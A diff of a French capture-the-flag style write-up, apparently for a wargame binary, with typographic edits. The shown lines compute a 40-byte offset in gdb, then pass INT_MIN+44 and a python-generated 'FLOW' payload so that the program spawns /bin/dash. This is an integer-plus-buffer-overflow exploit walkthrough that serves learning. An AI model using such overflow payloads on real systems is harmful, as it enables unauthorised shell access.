@@ -56,10 +56,10 @@ Lorsqu'on affiche `esp`, on obtient l'adresse de notre début de `buffer` : `0xb
 Lorsqu'on affiche `esp+0x3c`, donc ce qui correspond a notre comparaison,  on obtient `0xbffff6ec` : `0x00000008`. Nous avons donc ici notre adresse de comparaison : `0xbffff6ec` et notre premier argument `0x00000008` (8 en base10).
 
 Nous voulons maintenant savoir quelle valeur nous devons mettre afin que notre programme exécute bien un `shell`. 
-Nous avons notre `adresse de cmp` ainsi que notre adresse de `debut de buffer`.
-Nous allons donc faire 
+Nous avons notre `adresse de cmp` ainsi que notre `adresse de début de buffer`.
+Nous allons donc faire :
 ```
-[Adresse de cmp] - [adresse de début buffer]
+[Adresse de cmp] - [Adresse de début de buffer]
 0xbffff6ec - 0xbffff6c4 = 0x28 = 40
 ```
 On peut vérifier cela avec gdb.
@@ -92,7 +92,7 @@ On peut maintenant tester avec la valeur `int min` +  44.
 [...]
 > (gdb) r -2147483607 `python -c 'print "\x46\x4c\x4f\x57"*11'`
 > (gdb) continue
-> [...]
+[...]
 process 3514 is executing new program: /bin/dash
 ```
 Notre programme se lance bien !
